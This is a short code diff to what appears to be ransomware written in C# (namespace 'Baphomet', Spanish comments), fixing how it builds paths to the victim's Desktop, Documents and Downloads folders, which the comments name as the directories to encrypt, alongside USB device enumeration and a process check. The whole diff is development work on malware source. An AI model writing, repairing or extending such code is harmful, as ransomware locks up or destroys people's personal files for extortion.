@@ -23,7 +23,7 @@ namespace Baphomet
 
             //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
             //Aqui pondremos los directorios que deseamos cifrar.
-            var pathDirs = new[] { "\\Desktop","\\Documents","\\Download" };
+            var pathDirs = new[] { "Desktop","Documents","Downloads" };
             var  userDir = Path.Combine("C:\\Users\\",userName);
 
             var devicesLst = diag.GetUsbDevices();//Obtengo una lista de los usb conectados a la maquina.
@@ -34,7 +34,7 @@ namespace Baphomet
             diag.CheckProccess();
             for (int d = 0; d < pathDirs.Length; d++)//recorro cada uno de los dirs validos
             {
-                var targetPath = userDir + pathDirs[d];
+                var targetPath = Path.Combine(userDir,pathDirs[d]);
                 cryptep.directoryRoad(targetPath, key);
             }
 
